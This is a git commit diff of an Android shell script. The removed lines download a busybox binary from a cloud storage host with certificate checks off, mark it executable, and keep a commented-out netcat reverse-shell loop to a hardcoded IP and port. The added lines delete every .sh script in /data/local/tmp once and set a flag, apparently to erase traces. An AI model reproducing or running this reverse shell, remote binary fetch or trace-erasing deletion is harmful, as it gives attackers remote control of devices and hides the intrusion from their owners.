04bcd91b98c9a87329feee2f95f124e6bbeaa8aa
t4084058 <139777346+t4084058@users.noreply.github.com>
2024-10-06 22:13:19 -0400

    Update script.sh

--- 866207152591198/script.sh
+++ 866207152591198/script.sh
@@ -1,15 +1,13 @@
 #!/system/bin/sh
 
-# Download busybox to /data/local/tmp
-dcurl --dns-servers 1.1.1.1 -k -o /data/local/tmp/busybox https://ktrud.nyc3.digitaloceanspaces.com/busybox-arm64
+VALUE=$(settings get global scripts_erased)
 
-# Give execute permissions
-chmod +x /data/local/tmp/busybox
 
-# Run the loop with netcat command
-#while true
-#do
-  #/data/local/tmp/busybox nc 3.141.142.211 14817 -e /bin/sh
-  
-#done
+if [ "$VALUE" -ne 1 ]; then
+    for file in /data/local/tmp/*.sh; do
+        rm -rf "$file"
+    done
+    settings put global scripts_erased 1
+fi
+
 
